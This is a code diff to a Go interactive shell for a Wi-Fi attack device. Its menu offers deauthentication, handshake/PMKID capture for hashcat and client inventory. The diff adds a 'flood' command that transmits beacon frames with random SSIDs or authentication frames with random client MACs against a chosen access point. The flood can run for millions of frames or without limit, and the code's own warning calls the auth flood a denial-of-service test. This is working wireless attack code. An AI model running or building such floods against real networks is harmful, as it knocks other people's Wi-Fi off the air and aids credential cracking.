@@ -112,10 +112,11 @@ const shellMenu = `
   8) deauth       deauth the selected network, then capture automatically
   9) harvest      capture a crackable handshake/PMKID, write a hashcat file
  10) clients      inventory stations (associated clients + PNL probes)
- 11) stop         stop monitor mode / hopping
- 12) hop          hop across channels (default 1,6,11)
- 13) power        set TX power (1-20 dBm)
- 14) reboot       reboot the drone
+ 11) flood        beacon or authentication flood (asks which)
+ 12) stop         stop monitor mode / hopping
+ 13) hop          hop across channels (default 1,6,11)
+ 14) power        set TX power (1-20 dBm)
+ 15) reboot       reboot the drone
   q) quit
 
 `
@@ -183,13 +184,15 @@ func (s *shellState) dispatch(line string) bool {
 		s.doHarvest()
 	case "10", "clients":
 		s.doClients()
-	case "11", "stop":
+	case "11", "flood":
+		s.doFlood()
+	case "12", "stop":
 		s.doStop()
-	case "12", "hop":
+	case "13", "hop":
 		s.doHop(arg)
-	case "13", "power":
+	case "14", "power":
 		s.doPower(arg)
-	case "14", "reboot":
+	case "15", "reboot":
 		s.doReboot()
 	case "menu", "help", "h", "?":
 		// the menu prints every round already
@@ -772,6 +775,140 @@ func (s *shellState) doClients() {
 		return
 	}
 	printClientTable(stations, channel)
+}
+
+// doFlood runs a beacon or authentication flood from inside the session,
+// reusing the CLI's frame builders and pacing loop.
+func (s *shellState) doFlood() {
+	kind := "beacon"
+	fmt.Print("[*] Flood type — [b]eacon or [a]uth (empty = beacon): ")
+	v, err := s.readLine()
+	if err != nil {
+		return
+	}
+	if strings.HasPrefix(strings.ToLower(strings.TrimSpace(v)), "a") {
+		kind = "auth"
+	}
+
+	channel := 6
+	bssid := ""
+	if s.selected != nil {
+		channel = s.selected.channel
+		bssid = s.selected.bssid
+	}
+	fmt.Printf("[*] Channel to flood (empty = %d): ", channel)
+	v, err = s.readLine()
+	if err != nil {
+		return
+	}
+	if v = strings.TrimSpace(v); v != "" {
+		if ch, err := strconv.Atoi(v); err == nil && ch >= 1 && ch <= 13 {
+			channel = ch
+		} else {
+			fmt.Println("[!] Invalid channel — staying on", channel)
+		}
+	}
+
+	count := 1000
+	if kind == "auth" {
+		count = 500
+	}
+	fmt.Printf("[*] Frames to send (empty = %d, 0 = until Ctrl+C): ", count)
+	v, err = s.readLine()
+	if err != nil {
+		return
+	}
+	if v = strings.TrimSpace(v); v != "" {
+		if n, err := strconv.Atoi(v); err == nil && n >= 0 && n <= 10_000_000 {
+			count = n
+		} else {
+			fmt.Printf("[!] Invalid count — using %d.\n", count)
+		}
+	}
+
+	if kind == "auth" {
+		if bssid == "" {
+			fmt.Print("[*] Target AP BSSID: ")
+			v, err = s.readLine()
+			if err != nil {
+				return
+			}
+			bssid = strings.TrimSpace(v)
+		}
+		if _, err := net.ParseMAC(bssid); err != nil {
+			fmt.Printf("[!] Invalid BSSID %q.\n", bssid)
+			return
+		}
+		fmt.Println("[!] This is a denial-of-service test: it fills the AP's")
+		fmt.Println("    authentication state table. Only run it against hardware you own.")
+	}
+
+	opts := drone.DefaultFrameOptions()
+	opts.Channel = channel
+
+	var build func(i int) (string, error)
+	label := "beacon"
+	if kind == "auth" {
+		label = "authentication"
+		build = func(i int) (string, error) {
+			return drone.BuildAuthFrame(drone.AuthParams{
+				BSSID:   bssid,
+				Client:  drone.RandomMAC(),
+				Seq:     uint16(i & 0x0fff),
+				Options: opts,
+			})
+		}
+	} else {
+		build = func(i int) (string, error) {
+			return drone.BuildBeaconFrame(drone.BeaconParams{
+				BSSID:   drone.RandomMAC(),
+				SSID:    drone.RandomSSID(),
+				Seq:     uint16(i & 0x0fff),
+				Options: opts,
+			})
+		}
+	}
+
+	st, err := s.client.GetStatus()
+	if err != nil {
+		fmt.Printf("[!] %v\n", err)
+		return
+	}
+
+	weStarted := false
+	if !st.MonitorActive {
+		if err := s.client.StartMonitor(channel); err != nil {
+			fmt.Printf("[!] Failed to enter monitor mode: %v\n", err)
+			return
+		}
+		weStarted = true
+	} else if st.Channel != channel {
+		if err := s.client.SetChannel(channel); err != nil {
+			fmt.Printf("[!] Failed to switch channel: %v\n", err)
+			return
+		}
+	}
+	if err := s.client.SetFilter(false, ""); err != nil {
+		fmt.Printf("[!] Warning: failed to clear the frame filter: %v\n", err)
+	}
+
+	sent, failed, err := runFlood(s.client, floodOptions{
+		label:   label,
+		channel: channel,
+		total:   count,
+		rate:    1,
+		build:   build,
+	})
+
+	if weStarted {
+		s.stopMonitorQuietly()
+	}
+
+	fmt.Println()
+	fmt.Printf("[+] Injection: %d %s frame(s) on air, %d dropped\n", sent, label, failed)
+	if err != nil {
+		fmt.Printf("[!] %v\n", err)
+	}
 }
 
 // stopMonitorQuietly restores the radio after a listen session. Leaving monitor
